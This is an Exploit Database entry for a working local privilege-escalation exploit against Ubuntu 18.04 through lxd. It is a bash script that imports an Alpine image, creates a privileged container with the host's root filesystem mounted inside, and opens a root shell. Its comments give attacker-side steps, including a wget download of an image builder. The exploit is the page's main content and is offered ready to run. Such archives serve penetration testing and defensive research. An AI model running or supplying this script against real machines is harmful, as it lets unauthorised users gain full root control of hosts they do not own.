 Exploit Database
EXPLOIT DATABASE
EXPLOITS

GHDB

PAPERS

SHELLCODES

SEARCH EDB

SEARCHSPLOIT MANUAL

SUBMISSIONS

ONLINE TRAINING

PWK
PENETRATION TESTING WITH KALI
AWAE
ADVANCED WEB ATTACKS
WIFU
WIRELESS ATTACKS
OFFSEC RESOURCES

Exploit Database
 
  
 
GET CERTIFIED
Ubuntu 18.04 - 'lxd' Privilege Escalation
EDB-ID:
46978
CVE:
N/A

EDB Verified: 
Author:
S4VITAR
Type:
LOCAL

Exploit:    /   
Platform:
LINUX
Date:
2019-06-10

Vulnerable App:
Become a Certified Penetration Tester
Enroll in Penetration Testing with Kali Linux and pass the exam to become an Offensive Security Certified Professional (OSCP). All new content for 2020.

GET CERTIFIED

 
#!/usr/bin/env bash

# ----------------------------------
# Authors: Marcelo Vazquez (S4vitar)
#	   Victor Lasa      (vowkin)
# ----------------------------------

# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine

function helpPanel(){
  echo -e "\nUsage:"
  echo -e "\t[-f] Filename (.tar.gz alpine file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
  cleanup
}

function cleanup(){
  echo -en "\n[*] Removing container..."
  lxc stop privesc && lxc delete privesc && lxc image delete alpine
  echo " [√]"
}

set -o nounset
set -o errexit

declare -i parameter_enable=0; while getopts ":f:h:" arg; do
  case $arg in
    f) filename=$OPTARG && let parameter_enable+=1;;
    h) helpPanel;;
  esac
done

if [ $parameter_enable -ne 1 ]; then
  helpPanel
else
  createContainer
fi
            
Copy
Tags:
Advisory/Source: Link
 
Downloads	Certifications	Training	Professional Services
Kali Linux	OSCP	Penetration Testing with Kali Linux (PWK) - ALL NEW for 2020	Penetration Testing
Kali NetHunter	OSWP	Advanced Web Attacks and Exploitation (AWAE) - Updated for 2020	Advanced Attack Simulation
Kali Linux Revealed Book	OSCE	Offensive Security Wireless Attacks (WiFu)	Application Security Assessment
OSEE	Cracking the Perimeter (CTP)	
OSWE	Metasploit Unleashed (MSFU)	
KLCP	Free Kali Linux Training	
   EXPLOIT DATABASE BY OFFENSIVE SECURITY TERMS PRIVACY ABOUT US FAQ COOKIES
© OffSec Services Limited 2020. All rights reserved.
